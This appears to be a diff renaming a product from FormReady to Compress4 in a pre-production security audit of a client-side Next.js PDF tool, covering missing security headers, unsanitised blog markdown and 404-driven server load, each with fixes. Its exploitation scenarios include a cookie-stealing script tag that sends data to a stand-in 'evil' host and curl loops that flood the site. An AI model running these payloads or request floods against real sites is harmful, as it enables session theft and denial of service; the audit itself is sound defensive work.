@@ -1,4 +1,4 @@
-# FormReady — Pre-Production Security Audit
+# Compress4 — Pre-Production Security Audit
 
 **Date:** 2026-05-11
 **Auditor:** Senior application-security review
@@ -11,7 +11,7 @@
 
 ### Overall security posture: **B+ (strong, with hardening required before public launch)**
 
-FormReady's architecture is its biggest security asset. The application is **100% client-side** — there is no backend, no upload endpoint, no authentication, no database, and no `fetch()` calls in application code. This eliminates 80% of the attack surface of a typical web app:
+Compress4's architecture is its biggest security asset. The application is **100% client-side** — there is no backend, no upload endpoint, no authentication, no database, and no `fetch()` calls in application code. This eliminates 80% of the attack surface of a typical web app:
 
 - ✅ No SQL injection possible (no database query layer)
 - ✅ No SSRF possible (no server-side network egress)
@@ -77,7 +77,7 @@ Severity scale: **Critical** (immediate exploit) · **High** (significant risk, 
 - `X-Content-Type-Options: nosniff` — relies on Vercel default (it is set, but should be explicit)
 
 **Exploitation scenario.**
-1. **Clickjacking the upload flow.** Without `X-Frame-Options: DENY` or CSP `frame-ancestors 'none'`, an attacker can embed FormReady inside an iframe on `attacker.tld`, overlay a transparent button, and trick a user into uploading their Aadhaar PDF "into" what they believe is FormReady but is actually a phishing capture. (Mitigated in this app because the file genuinely never leaves the browser — but the user-experience attack remains: they trust the FormReady UI inside the iframe and may believe an attacker-page is FormReady.)
+1. **Clickjacking the upload flow.** Without `X-Frame-Options: DENY` or CSP `frame-ancestors 'none'`, an attacker can embed Compress4 inside an iframe on `attacker.tld`, overlay a transparent button, and trick a user into uploading their Aadhaar PDF "into" what they believe is Compress4 but is actually a phishing capture. (Mitigated in this app because the file genuinely never leaves the browser — but the user-experience attack remains: they trust the Compress4 UI inside the iframe and may believe an attacker-page is Compress4.)
 2. **Residual XSS amplification.** Any future XSS (e.g., via a future blog comments feature) becomes maximum-impact because there is no CSP `script-src` allowlist to block injected scripts.
 3. **Mixed-content + downgrade.** Without HSTS, the first visit over HTTP can be intercepted to deliver an HTTP-to-HTTPS-stripping proxy.
 
@@ -153,11 +153,11 @@ const nextConfig = {
 
 **Verify after deploy.**
 ```bash
-curl -sI https://formready.in/ | grep -iE "content-security-policy|strict-transport|x-frame|referrer-policy|permissions-policy"
+curl -sI https://compress4.com/ | grep -iE "content-security-policy|strict-transport|x-frame|referrer-policy|permissions-policy"
 # All five should be present.
 ```
 
-Then run https://securityheaders.com/?q=formready.in — should score **A or A+**.
+Then run https://securityheaders.com/?q=compress4.com — should score **A or A+**.
 
 ---
 
@@ -187,7 +187,7 @@ Then run https://securityheaders.com/?q=formready.in — should score **A or A+*
 - HTTP smuggling via rewrites: **N/A** — `next.config.mjs` has no `rewrites()` configuration.
 
 **Exploitation scenario (on self-hosted node).**
-An attacker scripts `for i in {1..1000}; do curl -H "RSC: 1" -H "Next-Router-State-Tree: $(garbage)" https://formready.in/compress-pdf & done` and exhausts memory on the Next.js server.
+An attacker scripts `for i in {1..1000}; do curl -H "RSC: 1" -H "Next-Router-State-Tree: $(garbage)" https://compress4.com/compress-pdf & done` and exhausts memory on the Next.js server.
 
 **Recommended fix.**
 Upgrade Next.js to the latest 15.x.
@@ -275,7 +275,7 @@ Defense-in-depth says: sanitize at the render boundary, not at the source. The r
 1. Attacker compromises a contributor's GitHub account.
 2. Pushes `content/blog/innocent-looking-post.md` with `<script>fetch('https://evil/?c=' + document.cookie)</script>` (or `<img onerror>` since marked passes `<script>` through too).
 3. CI builds + deploys.
-4. Every visitor to `/blog/innocent-looking-post` runs the script under the formready.in origin — can read cookies, locale, future session tokens, can mount any subsequent UI.
+4. Every visitor to `/blog/innocent-looking-post` runs the script under the compress4.com origin — can read cookies, locale, future session tokens, can mount any subsequent UI.
 
 **Recommended fix.**
 Add DOMPurify to the rendering pipeline:
@@ -356,7 +356,7 @@ A request to `/random-string-12345` triggers SSR of `notFound()`. Each miss is a
 **Exploitation scenario.**
 ```bash
 # 100k unique slug requests → 100k SSR cycles
-seq 1 100000 | xargs -P 50 -I{} curl -s -o /dev/null https://formready.in/abc-{}-test
+seq 1 100000 | xargs -P 50 -I{} curl -s -o /dev/null https://compress4.com/abc-{}-test
 ```
 
 On Vercel: the function may not OOM but you'll burn through serverless minutes and the bill. On self-hosted: the node process can run out of memory under sustained load.
@@ -387,8 +387,8 @@ With `dynamicParams = false`, unknown slugs return a static `404` from the CDN �
 
 **Verify after deploy.**
 ```bash
-curl -sI https://formready.in/known-slug      # 200
-curl -sI https://formready.in/random-12345    # 404 from CDN, no server hit
+curl -sI https://compress4.com/known-slug      # 200
+curl -sI https://compress4.com/random-12345    # 404 from CDN, no server hit
 ```
 
 ---
@@ -639,7 +639,7 @@ The `/design-system` route renders the internal component library / token refere
 It's listed in `robots.txt` disallow but that's a hint to crawlers, not enforcement — anyone who knows the URL can view it.
 
 **Risk.**
-- An attacker browsing `/design-system` learns FormReady's exact look-and-feel, internal copy patterns, and component construction. Lowers the bar for phishing-page replicas.
+- An attacker browsing `/design-system` learns Compress4's exact look-and-feel, internal copy patterns, and component construction. Lowers the bar for phishing-page replicas.
 - The page is built and shipped in the production bundle — small JS footprint cost.
 
 **Recommended fix.**
@@ -664,8 +664,8 @@ Set `NEXT_PUBLIC_SHOW_DESIGN_SYSTEM=1` on Vercel preview environments only.
 
 Verify after deploy:
 ```bash
-curl -sI https://formready.in/design-system    # 404
-curl -sI https://preview.formready.in/design-system  # 200 (if option B)
+curl -sI https://compress4.com/design-system    # 404
+curl -sI https://preview.compress4.com/design-system  # 200 (if option B)
 ```
 
 ---
